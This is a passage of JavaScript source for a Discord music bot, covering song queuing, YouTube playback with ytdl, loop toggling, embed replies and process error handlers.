            return message.channel.send({
                embed: {
                    color: "GREEN",
                    description: `🔁  **|**  Loop is **\`${serverQueue.loop === true ? "enabled" : "disabled"}\`**`
                }
            });
        };
        return message.channel.send({
            embed: {
                color: "RED",
                description: "There is nothing playing"
            }
        });
    }
});

async function handleVideo(video, message, voiceChannel, playlist = false) {
    const serverQueue = queue.get(message.guild.id);
    const song = {
        id: video.id,
        title: Util.escapeMarkdown(video.title),
        url: `https://www.youtube.com/watch?v=${video.id}`
    };
    if (!serverQueue) {
        const queueConstruct = {
            textChannel: message.channel,
            voiceChannel: voiceChannel,
            connection: null,
            songs: [],
            volume: 100,
            playing: true,
            loop: false
        };
        queue.set(message.guild.id, queueConstruct);
        queueConstruct.songs.push(song);

        try {
            var connection = await voiceChannel.join();
            queueConstruct.connection = connection;
            play(message.guild, queueConstruct.songs[0]);
        } catch (error) {
            console.error(`[ERROR] I could not join the voice channel, because: ${error}`);
            queue.delete(message.guild.id);
            return message.channel.send({
                embed: {
                    color: "RED",
                    description: `I could not join the voice channel, because: **\`${error}\`**`
                }
            });
        }
    } else {
        serverQueue.songs.push(song);
        if (playlist) return;
        else return message.channel.send({
            embed: {
                color: "GREEN",
                description: `✅  **|**  **\`${song.title}\`** has been added to the queue`
            }
        });
    }
    return;
}

function chunk(array, chunkSize) {
    const temp = [];
    for (let i = 0; i < array.length; i += chunkSize) {
        temp.push(array.slice(i, i + chunkSize));
    }
    return temp;
}

function play(guild, song) {
    const serverQueue = queue.get(guild.id);

    if (!song) {
        serverQueue.voiceChannel.leave();
        return queue.delete(guild.id);
    }

    const dispatcher = serverQueue.connection.play(ytdl(song.url))
        .on("finish", () => {
            const shiffed = serverQueue.songs.shift();
            if (serverQueue.loop === true) {
                serverQueue.songs.push(shiffed);
            };
            play(guild, serverQueue.songs[0]);
        })
        .on("error", error => console.error(error));
    dispatcher.setVolume(serverQueue.volume / 100);

    serverQueue.textChannel.send({
        embed: {
            color: "BLUE",
            description: `🎶  **|**  Start Playing: **\`${song.title}\`**`
        }
    });
}

bot.login(process.env.BOT_TOKEN);

process.on("unhandledRejection", (reason, promise) => {
    try {
        console.error("Unhandled Rejection at: ", promise, "reason: ", reason.stack || reason);
    } catch {
        console.error(reason);
    }
});

process.on("uncaughtException", err => {
    console.error(`Caught exception: ${err}`);
    process.exit(1);
});
